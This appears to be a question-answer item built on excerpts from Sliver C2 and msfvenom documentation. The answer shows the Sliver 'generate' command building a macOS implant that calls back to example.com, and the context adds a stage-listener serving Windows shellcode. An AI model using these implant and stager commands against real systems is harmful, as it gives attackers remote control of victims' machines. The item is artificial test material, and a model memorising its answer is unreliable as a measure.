Context:```
Options:
    -p, --payload       <payload>    Payload to use. Specify a '-' or stdin to use custom payloads
        --payload-options            List the payload's standard options
    -l, --list          [type]       List a module type. Options are: payloads, encoders, nops, all
## Generate the Implant
#### Basic Example

```
sliver > generate --http example.com --os mac

[*] Generating new darwin/amd64 implant binary
[*] Build completed in 00:00:05
[*] Implant saved to /Users/moloch/Desktop/WORKING_HACIENDA
```
sliver > stage-listener --url http://192.168.122.1:1234 --profile win-shellcode --prepend-size
```

Either `msfconsole` or `msfvenom` can be used directly to generate stager shellcodes or binaries with the `custom` payload type:
```
 Question: Provide a complete example of using the generate command in Sliver to create a payload. The example should include common parameters and the expected output. Respond with just a few command line. 

 Your response: 
```
sliver > generate --http example.com --os mac
[*] Generating new darwin/amd64 implant binary
[*] Build completed in 00:00:05
[*] Implant saved to /Users/moloch/Desktop/WORKING_HACIENDA
```
